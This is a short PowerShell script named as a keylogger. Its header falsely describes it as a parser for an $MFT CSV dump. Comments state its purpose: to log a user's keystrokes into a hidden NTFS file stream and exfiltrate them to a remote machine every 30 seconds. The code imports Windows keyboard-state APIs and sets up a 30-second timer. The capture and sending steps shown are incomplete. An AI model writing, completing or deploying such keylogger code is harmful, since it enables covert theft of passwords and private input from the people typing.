# Name: keylogger.ps1
# Desc: Powershell script to parse $MFT CSV dump
# Last Revision: 09/15/2017

# when a user enters data it adds the user content to a NTFS file stream. Script reads
# the file stream and exfiltrates the data to a remote machine on a 30 second interval.
# should use a compression format when sending data across the network.
function keylogger{
  # API call signatures and dll imports
  $API_signatures = @'
  [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
  public static extern short GetAsyncKeyState(int virtualKeyCode);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int GetKeyboardState(byte[] keystate);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int MapVirtualKey(uint uCode, int uMapType);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $getKeyState = Add-Type -MemberDefinition $API_signatures -name "Win32GetState" -namespace Win32Functions -passThru # get the key state, whether there is something to track or not
  $timer = New-Object Timers.Timer
## Now setup the Timer instance to fire events
$timer.Interval = 30000 # fire every 30 seconds
$timer.AutoReset = $true # reset after it counts to 30 seconds
$timer.Enabled = $true # yes, enable timer
}
keylogger # run keylogger
